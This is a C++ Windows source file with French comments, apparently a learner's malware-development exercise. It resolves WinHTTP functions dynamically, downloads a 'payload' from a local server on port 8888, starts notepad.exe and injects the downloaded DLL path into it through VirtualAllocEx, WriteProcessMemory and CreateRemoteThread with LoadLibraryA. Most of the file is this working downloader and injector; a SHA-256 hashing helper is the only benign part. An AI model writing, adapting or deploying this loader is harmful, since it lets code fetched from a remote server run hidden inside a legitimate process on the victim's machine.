#include <iostream>
#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>


typedef HMODULE(WINAPI* LoadLibraryFn)(LPCSTR lpLibFileName);
typedef HINTERNET(NTAPI* _WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
typedef HINTERNET(NTAPI* _WinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR ppwszAcceptTypes, DWORD dwFlags);
typedef HINTERNET(WINAPI* WINHTTPOPEN)(LPCWSTR pwszUserAgent, DWORD dwAccessType, LPCWSTR pwszProxyName, LPCWSTR pwszProxyBypass, DWORD dwFlags);
typedef HINTERNET(WINAPI* WINHTTPCONNECT)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
typedef HINTERNET(WINAPI* WINHTTPOPENREQUEST)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags);
typedef HINTERNET(NTAPI* _WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
typedef BOOL(NTAPI* _WinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef BOOL(NTAPI* _WinHttpSendRequest)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
typedef BOOL(NTAPI* _WinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);

// typedef BOOL(NTAPI _WinHttpCloseHandle)(HINTERNET hInternet);
// typedef BOOL(NTAPI* _WinHttpQueryDataAvailable)(HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
// typedef UINT(CALLBACK* fnMessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID, ULONG_PTR, PULONG, ULONG, ULONG);
// typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, PULONG);
// typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);




// Fonction pour calculer le Hash SHA-256 d'une chaîne de caractères
bool CalculateSHA256Hash(const char* input, DWORD inputSize, BYTE* hashBuffer) {
    HCRYPTPROV hProv = NULL;
    HCRYPTHASH hHash = NULL;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "Impossible d'acquérir le contexte de chiffrement" << std::endl;
        return false;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        std::cerr << "Impossible de créer le hachage" << std::endl;
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptHashData(hHash, reinterpret_cast<const BYTE*>(input), inputSize, 0)) {
        std::cerr << "Impossible de mettre en hachage les données" << std::endl;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    DWORD hashSize = 32;
    if (!CryptGetHashParam(hHash, HP_HASHVAL, hashBuffer, &hashSize, 0)) {
        std::cerr << "Impossible d'obtenir le hachage" << std::endl;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return true;
}



int Hash(const char* inputData) {
    DWORD inputSize = strlen(inputData);
    BYTE hashBuffer[32]; // Résultat du hash

    if (CalculateSHA256Hash(inputData, inputSize, hashBuffer)) {
        std::cout << "Hachage SHA-256 de '" << inputData << "': \n";
        for (int i = 0; i < 32; i++) {
            printf("%02x", hashBuffer[i]);
        }
        std::cout << std::endl;
    }

    else {
        std::cerr << "Erreur lors du calcul du hachage" << std::endl;
        return 1;
    }

}




int main() {

    HMODULE winhttp = LoadLibraryA("winhttp.dll");
    _WinHttpOpen WinHttpOpen = (_WinHttpOpen)GetProcAddress(winhttp, "WinHttpOpen");
    _WinHttpConnect WinHttpConnect = (_WinHttpConnect)GetProcAddress(winhttp, "WinHttpConnect");
    _WinHttpOpenRequest WinHttpOpenRequest = (_WinHttpOpenRequest)GetProcAddress(winhttp, "WinHttpOpenRequest");
    _WinHttpReadData WinHttpReadData = (_WinHttpReadData)GetProcAddress(winhttp, "WinHttpReadData");
    _WinHttpReceiveResponse WinHttpReceiveResponse = (_WinHttpReceiveResponse)GetProcAddress(winhttp, "WinHttpReceiveResponse");
    _WinHttpSendRequest WinHttpSendRequest = (_WinHttpSendRequest)GetProcAddress(winhttp, "WinHttpSendRequest");
    //HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    //HMODULE winhttp = GetModuleHandleA("winhttp.dll");


    LPCSTR dllName = "kernel32.dll";

    // Charge la bibliothèque kernel32.dll
    HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");
    if (!kernel32) {
        std::cerr << "Impossible de charger kernel32.dll" << std::endl;
        return 1;
    }

    // Récupére l'adresse de la fonction LoadLibraryA depuis kernel32.dll
    LoadLibraryFn loadLibrary = reinterpret_cast<LoadLibraryFn>(GetProcAddress(kernel32, "LoadLibraryA"));
    if (!loadLibrary) {
        std::cerr << "Impossible de récupérer l'adresse de LoadLibraryA" << std::endl;
        return 1;
    }

    // Charge la DLL
    HMODULE loadedDll = loadLibrary(dllName);
    if (!loadedDll) {
        std::cerr << "Impossible de charger la DLL : " << dllName << std::endl;
        return 1;
    }

    std::cout << "DLL chargee avec succes." << std::endl;

    // Libère la DLL
    FreeLibrary(loadedDll);

    // Test la fonction de hashage
    const char* inputData = "Le developpement de Malware c'est genial";
    Hash(inputData);

    // Récupération du Payload
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    hSession = WinHttpOpen(L"WinHTTP Example/1.0", 0, NULL, NULL, 0);
    
    if(!hSession)
        printf("Error %d has occurred\n", GetLastError());
    
    // HTTP server
    if (hSession)
        hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8888, 0);

    // HTTP request
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/download", NULL, NULL, NULL, NULL);

    // Envoi de la demande HTTP.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
        
    // Attente de la réponse du serveur
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Lecture des données du fichier téléchargé
    std::string downloadedContent; // Variable de stockage du contenu de la payload

    if (bResults) {
        char buffer[1024];
        DWORD bytesRead = 0;

        // Affichage du contenu de la payload
        do {
            if (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
                if (bytesRead > 0) {
                    downloadedContent.append(buffer, bytesRead);
                }
            }
            else {
                printf("Erreur lors de la lecture des données\n");
                break;
            }
        } while (bytesRead > 0);

        std::cout << "Contenu telecharge : \n" << downloadedContent << std::endl;

        // Hashage de la variable downloadedContent
        const char* downloadedContentHash = downloadedContent.c_str();
        //Hash(downloadedContentHash);

        // Exécution de la Payload
        const char* targetProcessPath = "C:\\Windows\\System32\\notepad.exe";
        const char* payloadPath = downloadedContentHash;

        STARTUPINFOA startupInfo = { sizeof(STARTUPINFOA) };
        PROCESS_INFORMATION processInfo;
        if (!CreateProcessA(targetProcessPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) {
            std::cerr << "Impossible de lancer le processus cible" << std::endl;
            return 1;
        }

        // Attendre que le processus cible soit prêt
        Sleep(2000);

        // Ouverture du processus cible
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processInfo.dwProcessId);
        if (!hProcess) {
            std::cerr << "Impossible d'ouvrir le processus cible" << std::endl;
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
            return 1;
        }

        // Chargement de la charge utile dans le processus cible
        LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMemory) {
            std::cerr << "Impossible d'allouer de la mémoire dans le processus cible" << std::endl;
            CloseHandle(hProcess);
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
            return 1;
        }

        if (!WriteProcessMemory(hProcess, remoteMemory, payloadPath, strlen(payloadPath) + 1, NULL)) {
            std::cerr << "Impossible d'écrire le chemin de la charge utile dans le processus cible" << std::endl;
            VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
            return 1;
        }

        // Création d'un thread distant pour exécuter la charge utile
        HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMemory, 0, NULL);
        if (!hRemoteThread) {
            std::cerr << "Impossible de créer un thread distant" << std::endl;
            VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
            return 1;
        }

        // Attendre que le thread distant se termine
        WaitForSingleObject(hRemoteThread, INFINITE);

        // Nettoyer les ressources
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hRemoteThread);
        CloseHandle(hProcess);
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);

        std::cout << "Charge utile executee avec succes dans le processus cible" << std::endl;

    }

    return 0;
}
